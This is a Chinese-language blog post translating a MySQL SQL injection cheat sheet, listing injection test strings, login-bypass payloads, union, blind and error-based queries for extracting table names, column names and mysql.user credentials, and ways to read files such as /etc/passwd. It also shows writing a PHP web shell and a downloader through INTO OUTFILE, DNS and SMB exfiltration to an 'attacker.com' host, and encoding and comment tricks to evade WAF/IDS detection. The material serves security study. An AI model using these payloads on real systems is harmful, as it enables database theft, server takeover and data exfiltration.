---
title: SQLi MySQL基础知识
date: 2018-03-19 15:54:24
tags:
		- SQLi
		- 翻译
		 
categories:
		- 翻译
---

翻译：SQL注入之MySQL篇。

<!-- more -->

##### [SQLi Mysql 基础知识](https://websec.ca/kb/sql_injection)

##### MySQL

##### Mysql 注入文章

###### [drops->Mysql注入科普](http://cb.drops.wiki/drops/tips-123.html)

###### [drops->Mysql注入技巧](http://cb.drops.wiki/drops/tips-7299.html)

###### [drops->Mysql报错注入原理](http://cb.drops.wiki/drops/tips-14312.html)

###### [drops-Mysql Trigger](http://cb.drops.wiki/drops/tips-3435.html)

###### [详解Mysql安全配置](http://www.freebuf.com/articles/database/36777.html)

###### [从安全角度深入理解MySQL编码转换机制](http://www.freebuf.com/articles/web/154932.html)

###### [MySQL 数据库安全加固](https://vxhly.github.io/2016/10/mysql-database-user-policy/)

##### 默认数据库



 数据库名字 | 条件         
 -| -
     mysql   		|    需要root权限
information_schema | Mysql >= 5.0   


##### 测试注入

错误意味这这个查询请求是无效的(显示Mysql/在网站中不显示内容)

正确意味这个查询是有效的(如正常一样有内容展示)

__字符型__

	Given the query SELECT * FROM Table WHERE id = '1';
	
	'	False
	''	True
	"	False
	""	True
	\	False
	\\	True
	
	例子：
	SELECT * FROM Articles WHERE id = '1''';
	SELECT 1 FROM dual WHERE 1 = '1'''''''''''''UNION SELECT '2';

	注意：

	* 只要它们配对，就可以使用尽可能多的撇号和引号
	* 可以在引号之后继续拼接语句
	* 引号逃逸引号

__数字型__

	Given the query SELECT * FROM Table WHERE id = 1;
	
	AND 1	True
	AND 0	False
	AND true	True
	AND false	False
	1-false	Returns 1 if vulnerable
	1-true	Returns 0 if vulnerable
	1*56	Returns 56 if vulnerable
	1*56	Returns 1 if not vulnerable
	
	Example:
	SELECT * FROM Users WHERE id = 3-2;
	Notes:
	
	true is equal to 1.
	false is equal to 0.

__万能密码__

	Given the query SELECT * FROM Table WHERE username = '';
	
	' OR '1
	' OR 1 -- -
	" OR "" = "
	" OR 1 = 1 -- -
	'='
	'LIKE'
	'=0--+
	
	Example:
	SELECT * FROM Users WHERE username = 'Mike' AND password = '' OR '' = '';


##### 注释查询

以下内容可以注释掉语句

注释符 | 意义
-|-
# | Hash comment
/* | C-style comment
-- - | SQL comment
;%00 | Nullbyte 空子节
`    | 反引号

例子：

	SELECT * FROM Users WHERE username = '' OR 1=1 -- -' AND password = '';
	SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3`';	

注意：

当用作别名时，反引号只能用于结束查询。


##### 测试数据库版本

__变量__

	VERSION()
	@@VERSION
	@@GLOBAL.VERSION
	
	Example:
	SELECT * FROM Users WHERE id = '1' AND MID(VERSION(),1,1) = '5';
	Note:
	
	Output will contain -nt-log in case the DBMS runs on a Windows based machine.

__具体代码__

	/*!VERSION Specific Code*/
	
	Example:
	Given the query SELECT * FROM Users limit 1,{INJECTION POINT};
	
	1 /*!50094eaea*/;	False - version is equal or greater than 5.00.94
	1 /*!50096eaea*/;	True - version is lesser than 5.00.96
	1 /*!50095eaea*/;	False - version is equal to 5.00.95

	Note:
	
	在由于注入位置而无法向查询添加SQL的情况下，确定版本可能有用。有关特定的Mysql代码，可以查看特定Mysql代码。



##### 数据库凭证



	表 | mysql.user    mysql> select * from  mysql.user\G;
	列 | user,password
	当前用户 | user(), current_user(), current_user, system_user(), session_user()

__例子__

	SELECT current_user;
	SELECT CONCAT_WS(0x3A, user, password) FROM mysql.user WHERE user = 'root'-- (Privileged)


##### 数据库名字


	表 | information_schema.schemata, mysql.db
	列 | schema_name, db
	当前数据库 | database(), schema()从表名中查找列


__举例__

	SELECT database();
	SELECT schema_name FROM information_schema.schemata;
	SELECT DISTINCT(db) FROM mysql.db;-- (Privileged)


##### 服务器主机

	@@HOSTNAME

__举例__

	SELECT @@hostname;


##### 服务器MAC地址

通用唯一标识符是一个128位数字，最后12位数字由接口MAC地址形成。

	UUID()

最后十二位是`MAC`地址。

	mysql> select uuid();
	+--------------------------------------+
	| uuid()                               |
	+--------------------------------------+
	| cad2fe78-2b67-11e8-af12-00acc7375d92 |
	+--------------------------------------+

某些操作系统可能会返回一个48位随机字符串，而不是MAC地址。


##### 表和列

__确定列数__

__Order/Group By__

	GROUP/ORDER BY n+1;
	注意：
	逐步的增加这个数字直到出现一个错误的响应

	即使GROUP BY和ORDER BY在SQL中具有不同的funcionality，但它们都可以以完全相同的方式用于确定查询中的列数。

__举例__

	Given the query SELECT username, password, permission FROM Users WHERE id = '{INJECTION POINT}';
	
	1' ORDER BY 1--+	True
	1' ORDER BY 2--+	True
	1' ORDER BY 3--+	True
	1' ORDER BY 4--+	False - Query is only using 3 columns
	-1' UNION SELECT 1,2,3--+	True


__Error Based__

	GROUP/ORDER BY 1,2,3,4,5...

	与以前的方法类似，如果启用了错误显示，我们可以检查具有1个请求的列数。

__举例__

	Given the query SELECT username, password, permission FROM Users WHERE id = '{INJECTION POINT}'

	1' GROUP BY 1,2,3,4,5--+	Unknown column '4' in 'group statement'
	1' ORDER BY 1,2,3,4,5--+	Unknown column '4' in 'order clause'

__Error Based2__

	SELECT ... INTO var_list, var_list1, var_list2...

	如果启用了错误显示，则此方法有效
	当注入位于LIMIT字句之后，查找列数有用

__例子__

	Given the query SELECT permission FROM Users WHERE id = {INJECTION POINT};
	
	-1 UNION SELECT 1 INTO @,@,@	The used SELECT statements have a different number of columns
	-1 UNION SELECT 1 INTO @,@	The used SELECT statements have a different number of columns
	-1 UNION SELECT 1 INTO @	No error means query uses 1 column

__例子2__

	Given the query SELECT username, permission FROM Users limit 1,{INJECTION POINT};

	1 INTO @,@,@	The used SELECT statements have a different number of columns
	1 INTO @,@	No error means query uses 2 columns。没有错误则代表2列


__Error Based3__

	AND (SELECT * FROM SOME_EXISTING_TABLE) = 1

	Notes:
	
	条件是：知道了表名且启用了错误显示，则此功能可用
	它将返回表中的列数，而不是查询
	
	Example:
	Given the query SELECT permission FROM Users WHERE id = {INJECTION POINT};
	
	1 AND (SELECT * FROM Users) = 1	Operand should contain 3 column(s)

__检索表__

__Union__

	UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;
	
	提示：
	version=10 代表 Mysql 5 

__Blind__

	AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'

__Error__

	AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2)))

	(@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0);

	AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));-- Available in 5.1.5

__检索列__

__union__

	UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'

__Blind__

	AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'

__Error__


	AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2)))

	(@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0);

	AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));-- Available in MySQL 5.1.5

	AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)-- Fixed in MySQL 5.1

	AND (SELECT * FROM (SELECT * FROM SOME_EXISTING_TABLE JOIN SOME_EXISTING_TABLE b) a)

	AND (SELECT * FROM (SELECT * FROM SOME_EXISTING_TABLE JOIN SOME_EXISTING_TABLE b USING (SOME_EXISTING_COLUMN)) a)

__PROCEDURE ANALYSE()__ 程序分析

	PROCEDURE ANALYSE()

	注意：
	Web应用程序需要在要注入的SQL查询中显示所选列之一。

	例子：

	Given the query SELECT username, permission FROM Users WHERE id = 1;

	1 PROCEDURE ANALYSE()	Get the first column's name
	1 LIMIT 1,1 PROCEDURE ANALYSE()	Get the second column's name
	1 LIMIT 2,1 PROCEDURE ANALYSE()	Get the third column's name



__一次检索出大量的表和列__

	SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema>=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] >',table_name,' > ',column_name))))x

__Example:__

	SELECT * FROM Users WHERE id = '-1' UNION SELECT 1, 2, (SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema>=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] >',table_name,' > ',column_name))))x), 4--+';

__Output:__

	[ information_schema ] >CHARACTER_SETS > CHARACTER_SET_NAME
	[ information_schema ] >CHARACTER_SETS > DEFAULT_COLLATE_NAME
	[ information_schema ] >CHARACTER_SETS > DESCRIPTION
	[ information_schema ] >CHARACTER_SETS > MAXLEN
	[ information_schema ] >COLLATIONS > COLLATION_NAME
	[ information_schema ] >COLLATIONS > CHARACTER_SET_NAME
	[ information_schema ] >COLLATIONS > ID
	[ information_schema ] >COLLATIONS > IS_DEFAULT
	[ information_schema ] >COLLATIONS > IS_COMPILED
						

	SELECT MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns

__Example:__

	SELECT username FROM Users WHERE id = '-1' UNION SELECT MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns--+';

__Output:__

	Table: talk_revisions
	Column: revid
	
	Table: talk_revisions
	Column: userid
	
	Table: talk_revisions
	Column: user
	
	Table: talk_projects
	Column: priority

__从列名中查找表__

	SELECT table_name FROM information_schema.columns WHERE column_name = 'username';	Finds the table names for any columns named username.
	SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';	Finds the table names for any columns that contain the word user.

__从表名中查找列__

		 
	
	    SELECT column_name FROM information_schema.columns WHERE table_name = 'Users';  		|   Finds the columns for the Users table.
	SELECT column_name FROM information_schema.columns WHERE table_name LIKE '%user%';|Finds the column names for any tables that contain the word user.

__查看当前查询__

	SELECT info FROM information_schema.processlist	Available starting from MySQL 5.1.7

##### 转义(避免使用引号)

	SELECT * FROM Users WHERE username = 0x61646D696E	Hex encoding.
	SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)	CHAR() Function.

##### 字符串连接

	SELECT 'a' 'd' 'mi' 'n';
	SELECT CONCAT('a', 'd', 'm', 'i', 'n');
	SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');
	SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');

注意

如果其任何参数为NULL，CONCAT()将返回NULL。改用CONCAT_WS()。 
CONCAT_WS()的第一个参数为其参数的其余部分定义了分隔符。

##### 条件声明

	CASE
	IF()
	IFNULL()
	NULLIF()

例子：

	SELECT IF(1=1, true, false);
	SELECT CASE WHEN 1=1 THEN true ELSE false END;

##### 时间

	SLEEP()	MySQL 5
	BENCHMARK()	MySQL 4/5

例子：

	' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '

##### 权限

__文件权限__

以下的查询可以帮助查看文件权限是否分配给用户

	SELECT file_priv FROM mysql.user WHERE user = 'username';	Root privileges required	MySQL 4/5
	SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%username%';	No privileges required	MySQL 5

##### 读文件

用户如果具有文件权限，可以读取相应信息。

	LOAD_FILE()

例子：

	SELECT LOAD_FILE('/etc/passwd');
	SELECT LOAD_FILE(0x2F6574632F706173737764);

注意：

1. 文件必须位于服务器主机上
2. LOAD_FILE()的基本目录是@@datadir
3. 文件对Mysql用户必须是可读权限
4. 文件大小必须小于max_allowed_packet
5. max_allowed_pa​​cket的默认大小为1047552字节

##### 写文件

如果用户具有文件权限，可以创建新文件。

	INTO OUTFILE/DUMPFILE

__例子__

	To write a PHP shell:
	SELECT '<? system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';
	
	and then access it at:
	http://localhost/shell.php?c=cat%20/etc/passwd
	To write a downloader:
	SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'
	
	and then access it at:
	http://localhost/get.php?f=shell.php&u=http://localhost/c99.txt

__注意__

1. 文件不能用 `INTO OUTFILE`覆盖
2. INTO OUTFILE必须是查询中的最后一个语句。
3. 无法对路径名进行编码，因此需要引号。

##### 带外通道

__DNS 请求__

	SELECT LOAD_FILE(CONCAT('\\\\foo.',(select MID(version(),1,1)),'.attacker.com\\'));

__SMB 请求__

	
	' OR 1=1 INTO OUTFILE '\\\\attacker\\SMBshare\\output.txt



##### 堆积查询

根据PHP应用程序使用哪个驱动程序与数据库进行通信，MySQL可以进行堆栈查询。 

PDO_MYSQL驱动程序支持堆栈查询。 MySQLi（改进的扩展）驱动程序还通过multi_query(）函数支持堆栈查询。

__例子__

	SELECT * FROM Users WHERE ID=1 AND 1=0; INSERT INTO Users(username, password, priv) VALUES ('BobbyTables', 'kl20da$$','admin');
	SELECT * FROM Users WHERE ID=1 AND 1=0; SHOW COLUMNS FROM Users;


##### MySQL特定的代码

MySQL允许你在感叹号后指定版本号。注释中的语法仅在版本大于或等于指定的版本号时执行。

__例子__

	UNION SELECT /*!50000 5,null;%00*//*!40000 4,null-- ,*//*!30000 3,null-- x*/0,null--+
	SELECT 1/*!41320UNION/*!/*!/*!00000SELECT/*!/*!USER/*!(/*!/*!/*!*/);

__注意__

1. 第一个例子返回版本; 它使用2列的UNION。
2. 第二个例子演示了如何绕过WAF / IDS。


##### 模糊和混淆

以下的字符可以被当作空格。

	09	Horizontal Tab  水平Tab
	0A	New Line   新的一行
	0B	Vertical Tab  垂直Tab
	0C	New Page     新的一页
	0D	Carriage Return  回车
	A0	Non-breaking Space 不间断空格
	20	Space  空格

__例子__

	'%0A%09UNION%0CSELECT%A0NULL%20%23

圆括号也可以用来避免使用空格。

	28	(
	29	)

__例子__

	UNION(SELECT(column)FROM(table))

__AND/OR后面的一些中间字符__

	20	Space
	2B	+
	2D	-
	7E	~
	21	!
	40	@

__例子__

	SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~((1))

注意：

	dual是一个可用于测试的虚拟表。

__注释混淆__

评论可以用来分解查询来欺骗WAF/IDS并避免检测。 通过使用＃或 - 后跟一个换行符，我们可以将查询拆分为单独的行。

__例子__

	1'# 
	AND 0-- 
	UNION# I am a comment! 
	SELECT@tmp:=table_name x FROM-- 
	`information_schema`.tables LIMIT 1# 

URL编码

	1'%23%0AAND 0--%0AUNION%23 I am a comment!%0ASELECT@tmp:=table_name x FROM--%0A`information_schema`.tables LIMIT 1%23

一些函数可以使用注释和空格来混淆

	VERSION/**/%A0 (/*comment*/)

__编码__

对注入语句进行编码，有时候可以绕过`WAF/IDS`。

	URL Encoding	SELECT %74able_%6eame FROM information_schema.tables;
	Double URL Encoding	SELECT %2574able_%256eame FROM information_schema.tables;
	Unicode Encoding	SELECT %u0074able_%u6eame FROM information_schema.tables;
	Invalid Hex Encoding (ASP)	SELECT %tab%le_%na%me FROM information_schema.tables;

__避免关键字__

如果遇到IDS/WAF 检测一些关键字，还有一些除了编码之外的方法来绕过。

	information_schema.tables

	Spaces	information_schema . tables
	Backticks	`information_schema`.`tables`
	Specific Code	/*!information_schema.tables*/
	Alternative Names	information_schema.partitions 
	information_schema.statistics 
	information_schema.key_column_usage 
	information_schema.table_constraints

注意：备用名称可能取决于表中存在的PRIMARY键。


##### 运算符

	AND , &&	Logical AND
	=	Assign a value (as part of a SET statement, or as part of the SET clause in an UPDATE statement)
	:=	Assign a value
	BETWEEN ... AND ...	Check whether a value is within a range of values
	BINARY	Cast a string to a binary string
	&	Bitwise AND
	~	Invert bits
	|	Bitwise OR
	^	Bitwise XOR
	CASE	Case operator
	DIV	Integer division
	/	Division operator
	<=>	NULL-safe equal to operator
	=	Equal operator
	>=	Greater than or equal operator
	>	Greater than operator
	IS NOT NULL	NOT NULL value test
	IS NOT	Test a value against a boolean
	IS NULL	NULL value test
	IS	Test a value against a boolean
	<<	Left shift
	<=	Less than or equal operator
	<	Less than operator
	LIKE	Simple pattern matching
	-	Minus operator
	% or MOD	Modulo operator
	NOT BETWEEN ... AND ...	Check whether a value is not within a range of values
	!= , <>	Not equal operator
	NOT LIKE	Negation of simple pattern matching
	NOT REGEXP	Negation of REGEXP
	NOT , !	Negates value
	|| , OR	Logical OR
	+	Addition operator
	REGEXP	Pattern matching using regular expressions
	>>	Right shift
	RLIKE	Synonym for REGEXP
	SOUNDS LIKE	Compare sounds
	*	Multiplication operator
	-	Change the sign of the argument
	XOR	Logical XOR

##### 常数

	current_user
	null, \N
	true, false

##### 密码哈希

在MySQL4.1之前，由`PASSWORD()`函数计算的密码散列长度为16个字节。这样的哈希看起来像这样：

	PASSWORD('mypass')	6f8c114b58f2ce9e

从MySQL 4.1开始，`PASSWORD()`函数已被修改以产生更长的41字节散列值：

	PASSWORD('mypass')	*6C8989366EAF75BB670AD8EA7A7FC1176A95CEF4


##### 密码破解

`Cain & Abel and John the Ripper`都能破解`MySQL 3.x-6.x`的密码。

一个[`Metasploit`](http://www.metasploit.com/modules/auxiliary/analyze/jtr_mysql_fast)模块也可以。

